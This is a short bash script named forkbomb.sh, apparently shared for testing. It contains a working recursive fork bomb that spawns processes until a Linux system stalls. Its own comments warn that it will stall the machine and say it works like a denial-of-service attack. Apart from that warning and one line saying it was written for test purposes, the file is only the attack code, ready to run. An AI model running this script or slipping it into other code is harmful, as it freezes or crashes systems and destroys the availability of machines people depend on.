#!/bin/bash
#Filename: forkbomb.sh
#WARNING: THIS WILL STALL YOUR LINUX SYSTEM!
#Was written for test purposes
#Author: Lee
clear
#Standard recursive Fork Bomb that stalls linux based systems
#works like a DOS attack
forkbomb(){
forkbomb | forkbomb &
}; forkbomb